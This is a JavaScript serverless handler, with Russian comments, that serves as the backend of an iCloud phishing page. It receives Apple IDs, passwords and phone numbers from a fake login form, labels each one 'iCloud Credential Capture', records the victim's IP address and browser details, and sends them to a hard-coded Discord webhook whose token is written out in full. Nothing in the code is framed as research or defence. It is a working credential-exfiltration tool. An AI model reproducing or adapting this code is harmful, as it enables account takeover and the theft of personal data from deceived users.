// Обработчик данных с интеграцией Discord Webhook
const fetch = require('node-fetch'); // Убедитесь, что установили: npm install node-fetch@2

// Конфигурация (в продакшн использовать process.env)
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1483182140492611625/7JNKtGxkQlQBehia2Aqtx_SbTflKd-oGtsr0eB70DBJ1ySc10F22JlYiWtpn8tDhmOXv';

module.exports = async (req, res) => {
  // Разрешаем CORS для GitHub Pages
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;

    // Форматируем IP (Vercel передает заголовки)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    
    // Создаем embed для Discord
    const embed = {
      title: `🍎 iCloud Credential Capture - Stage ${data.stage || 'unknown'}`,
      color: 0x0071e3, // Apple blue
      fields: [],
      footer: {
        text: `IP: ${ip} | ${data.timestamp || new Date().toISOString()}`
      }
    };

    // Добавляем поля в зависимости от stage
    if (data.appleId) {
      embed.fields.push({ name: '📧 Apple ID', value: data.appleId, inline: true });
    }
    if (data.password) {
      embed.fields.push({ name: '🔑 Password', value: `||${data.password}||`, inline: true });
    }
    if (data.phone) {
      embed.fields.push({ name: '📱 Phone', value: data.phone, inline: true });
    }
    
    // Техническая информация
    embed.fields.push(
      { name: '🖥️ User Agent', value: data.userAgent || 'Unknown', inline: false },
      { name: '🌐 Referrer', value: data.referrer || 'Direct', inline: true },
      { name: '📍 URL', value: data.url || 'Unknown', inline: true }
    );

    // Отправка в Discord
    const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone New iCloud login attempt',
        embeds: [embed]
      })
    });

    if (!discordResponse.ok) {
      console.error('Discord webhook failed:', await discordResponse.text());
    }

    // Возвращаем успех клиенту
    return res.status(200).json({ 
      success: true, 
      stage: data.stage,
      message: 'Data received' 
    });

  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};
